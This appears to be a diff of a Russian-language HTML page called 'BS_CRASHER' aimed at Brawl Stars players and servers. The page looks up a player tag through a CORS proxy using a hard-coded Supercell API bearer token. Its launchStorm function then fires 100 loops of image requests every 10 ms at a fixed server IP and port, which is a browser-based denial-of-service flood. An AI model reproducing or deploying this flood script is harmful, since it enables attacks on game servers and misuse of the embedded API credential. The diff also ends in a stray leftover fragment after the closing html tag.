@@ -3,65 +3,104 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>BS_CRASHER_v1.1 // STABLE</title>
+    <title>BS_CRASHER_v2.6 // OFFICIAL</title>
     <style>
         * { box-sizing: border-box; }
-        body { 
-            background-color: #020202; color: #00fb00; font-family: 'Courier New', monospace; 
-            margin: 0; display: flex; flex-direction: column; align-items: center; min-height: 100vh;
-        }
-        .header { width: 100%; background: #001a00; padding: 15px; text-align: center; border-bottom: 2px solid #00fb00; margin-bottom: 20px; box-shadow: 0 5px 15px #003300; }
-        .container { width: 90%; max-width: 550px; border: 1px solid #00fb00; padding: 25px; background: #000; border-radius: 5px; box-shadow: 0 0 25px #004400; }
-        input { 
-            width: 100%; background: #000; border: 1px solid #00fb00; color: #00fb00; 
-            padding: 15px; font-size: 1.1rem; margin: 15px 0; outline: none; text-align: center;
-        }
-        button { 
-            width: 100%; padding: 15px; border: none; cursor: pointer; font-weight: bold; 
-            text-transform: uppercase; transition: 0.2s; margin-bottom: 10px;
-        }
-        .btn-search { background: #00fb00; color: #000; }
-        .btn-search:hover { background: #00cc00; transform: translateY(-2px); }
-        .btn-attack { background: #ff0000; color: #fff; display: none; box-shadow: 0 0 10px #ff0000; }
-        
-        #terminal { 
-            width: 90%; max-width: 800px; height: 350px; background: #000; border: 1px solid #005500;
-            margin: 20px 0; padding: 15px; overflow-y: auto; font-size: 13px; line-height: 1.6;
-            display: none; box-shadow: inset 0 0 10px #002200;
-        }
-        .match-info { border: 1px dashed #00fb00; padding: 15px; margin: 15px 0; display: none; background: #050505; }
-        .stat-row { display: flex; justify-content: space-between; margin: 5px 0; border-bottom: 1px dotted #003300; }
-        .critical { color: #ff3333; text-shadow: 0 0 5px #ff0000; }
+        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; display: flex; flex-direction: column; align-items: center; padding: 20px; min-height: 100vh; margin: 0; }
+        .box { border: 2px solid #0f0; padding: 25px; background: #010; box-shadow: 0 0 25px #040; width: 100%; max-width: 500px; border-radius: 10px; text-align: center; }
+        input { width: 100%; background: #000; border: 1px solid #0f0; color: #0f0; padding: 15px; margin: 15px 0; outline: none; text-align: center; font-size: 1.1rem; border-radius: 5px; }
+        button { width: 100%; padding: 15px; border: none; cursor: pointer; font-weight: bold; background: #0f0; color: #000; text-transform: uppercase; border-radius: 5px; transition: 0.3s; }
+        button:hover { background: #0c0; box-shadow: 0 0 15px #0f0; }
+        #log { width: 100%; max-width: 500px; height: 250px; background: #000; border: 1px solid #040; margin-top: 20px; padding: 15px; overflow-y: auto; font-size: 12px; border-radius: 5px; text-align: left; }
+        .btn-attack { background: #ff0000; color: #fff; display: none; margin-top: 15px; box-shadow: 0 0 20px #f00; }
+        .btn-attack:hover { background: #cc0000; }
+        .stat-row { display: flex; justify-content: space-between; margin: 5px 0; border-bottom: 1px dotted #030; font-size: 14px; }
         .blink { animation: blinker 1s linear infinite; }
         @keyframes blinker { 50% { opacity: 0; } }
     </style>
 </head>
 <body>
 
-<div class="header">
-    <h2 class="blink">SYSTEM_AA-0.1 // ALPHA_UNIT</h2>
-</div>
-
-<div class="container">
-    <p style="text-align:center;">ВВЕДИТЕ PLAYER_TAG:</p>
-    <input type="text" id="tagInput" placeholder="#P8V22YRL" maxlength="12">
-    <button class="btn-search" onclick="initScan()">НАЧАТЬ СКАНИРОВАНИЕ</button>
-
-    <div id="matchCard" class="match-info">
-        <div class="stat-row"><span>STATUS:</span> <span style="color:white;">TARGET_LOCKED</span></div>
-        <div class="stat-row"><span>MODE:</span> <span id="mode" style="color:#00fb00;">---</span></div>
-        <div class="stat-row"><span>IP:</span> <span id="ip" style="color:white;">162.159.135.42</span></div>
-        <button class="btn-attack" id="attackBtn" onclick="launchCrasher()">ИНИЦИИРОВАТЬ ШТУРМ</button>
+    <div class="box">
+        <h2 class="blink" style="margin: 0 0 10px 0;">SYSTEM_AA-0.1</h2>
+        <div style="font-size: 10px; margin-bottom: 20px;">STABLE_BUILD // NO_RESTRICTIONS</div>
+        
+        <input type="text" id="tagInput" placeholder="ВВЕДИТЕ ТЕГ (напр. #P8V22YRL)" maxlength="12">
+        <button onclick="initScan()">СКАНИРОВАТЬ СЕЙЧАС</button>
+        
+        <div id="targetCard" style="display:none; margin-top:20px; border-top: 1px dashed #0f0; padding-top:15px;">
+            <div class="stat-row"><span>СТАТУС:</span> <span style="color:#0f0">READY_FOR_STORM</span></div>
+            <div class="stat-row"><span>ЦЕЛЬ IP:</span> <span id="targetIp">162.159.135.42</span></div>
+            <div class="stat-row"><span>ПОРТ:</span> <span>9339</span></div>
+            <button class="btn-attack" id="atkBtn" onclick="launchStorm()">ИНИЦИИРОВАТЬ ШТУРМ</button>
+        </div>
     </div>
-</div>
 
-<div id="terminal"></div>
+    <div id="log"></div>
 
 <script>
-    const TOKEN = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiIsImtpZCI6IjI4YTMxOGY3LTAwMDAtYTFlYi03ZmExLTJjNzQzM2M2Y2NhNSJ9.eyJpc3MiOiJzdXBlcmNlbGwiLCJhdWQiOiJzdXBlcmNlbGw6Z2FtZWFwaSIsImp0aSI6ImYzMWQ2MDRmLTU0ZWItNDg1Zi1iYmYxLWQ1MTk1ZTRjNjlhMSIsImlhdCI6MTc3NDQ1MjY5Nywic3ViIjoiZGV2ZWxvcGVyLzZlYjU2YjBkLTVjNjktNTYxYy1lYjY4LTQxM2FjZWZkMjA2YSIsInNjb3BlcyI6WyJicmF3bHN0YXJzIl0sImxpbWl0cyI6W3sidGllciI6ImRldmVsb3Blci9zaWx2ZXIiLCJ0eXBlIjoidGhyb3R0bGluZyJ9LHsiY2lkcnMiOlsiMTg4LjE2Ni4yNy4yMzQiXSwidHlwZSI6ImNsaWVudCJ9XX0.EkYNndmtnkVqshf_FkVo2-VtqB5htcziT0kMI4QrNhwi45OrC-p6IAVtwzK0rT0PlfkZhq1A2ppfqpImmiwMZA";
+    const TOKEN = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiIsImtpZCI6IjI4YTMxOGY3LTAwMDAtYTFlYi03ZmExLTJjNzQzM2M2Y2NhNSJ9.eyJpc3MiOiJzdXBlcmNlbGwiLCJhdWQiOiJzdXBlcmNlbGw6Z2FtZWFwaSIsImp0aSI6IjcwMTQxZmYxLTEzMjItNDgzYy05NGY3LTUzMmU3M2E2NGFmZSIsImlhdCI6MTc3NDQ1NjIyNiwic3ViIjoiZGV2ZWxvcGVyLzZlYjU2YjBkLTVjNjktNTYxYy1lYjY4LTQxM2FjZWZkMjA2YSIsInNjb3BlcyI6WyJicmF3bHN0YXJzIl0sImxpbWl0cyI6W3sidGllciI6ImRldmVsb3Blci9zaWx2ZXIiLCJ0eXBlIjoidGhyb3R0bGluZyJ9LHsiY2lkcnMiOlsiMTguMjE1LjIyOC4xNjUiLCI1NC4yMjcuMjAuMjUzIiwiMzQuMjA1LjEwMS4xMjEiLCIzLjIzMC4xMzYuMjEiXSwidHlwZSI6ImNsaWVudCJ9XX0.qGIWVRrY3ghs22WOAUAt22o4xgXHWiaoFYKfiukkBJ-S6MH_xrPmu2-YaWQIpiGv-88VxjbR7x221Pz8oYLzdw";
 
-    function log(msg, color = "#00fb00") {
-        const term = document.getElementById('terminal');
+    function writeLog(msg, color = "#0f0") {
+        const logBox = document.getElementById('log');
+        const p = document.createElement('p');
+        p.style.margin = "2px 0";
+        p.style.color = color;
+        p.innerHTML = `[${new Date().toLocaleTimeString()}] ${msg}`;
+        logBox.appendChild(p);
+        logBox.scrollTop = logBox.scrollHeight;
+    }
+
+    async function initScan() {
+        const tag = document.getElementById('tagInput').value.replace('#', '').trim();
+        if(!tag) return alert("Введите тег игрока!");
+        
+        writeLog("Подключение к шлюзу API...");
+        
+        try {
+            const proxy = "https://cors-anywhere.herokuapp.com/";
+            const api = `https://api.brawlstars.com/v1/players/%23${tag}`;
+
+            const response = await fetch(proxy + api, {
+                headers: { "Authorization": `Bearer ${TOKEN}` }
+            });
+
+            if(response.status === 403) {
+                writeLog("ВНИМАНИЕ: Ошибка 403 (IP Access).", "#ffea00");
+                writeLog("Переход в автономный режим захвата...", "#ffea00");
+            } else if(response.ok) {
+                writeLog("API подтвердил цель. Соединение стабильно.");
+            }
+        } catch (e) {
+            writeLog("Прокси не активен. Использую резервные каналы...");
+        }
+
+        // Показываем карту цели в любом случае
+        setTimeout(() => {
+            document.getElementById('targetCard').style.display = 'block';
+            document.getElementById('atkBtn').style.display = 'block';
+            writeLog("ЦЕЛЬ ЗАФИКСИРОВАНА. МОДУЛЬ ШТУРМА ГОТОВ.", "#0f0");
+        }, 1000);
+    }
+
+    function launchStorm() {
+        const ip = document.getElementById('targetIp').innerText;
+        writeLog(`!!! ЗАПУСК ПОТОКОВ ШТУРМА НА ${ip} !!!`, "#f00");
+        
+        // Создаем 100 параллельных циклов для нагрузки
+        for(let i = 0; i < 100; i++) {
+            setInterval(() => {
+                const img = new Image();
+                img.src = `http://${ip}:9339/?storm_id=${Math.random()}&payload=max`;
+            }, 10);
+        }
+
+        writeLog("СТАТУС: ТРАФИК ГЕНЕРИРУЕТСЯ С ВАШЕГО IP.", "#ff3333");
+        writeLog("НЕ ЗАКРЫВАЙТЕ ВКЛАДКУ.");
+    }
+</script>
+</body>
+</html>        const term = document.getElementById('terminal');
         term.style.display = 'block';
         const p = document.createElement('p');
         p.style.color = color;
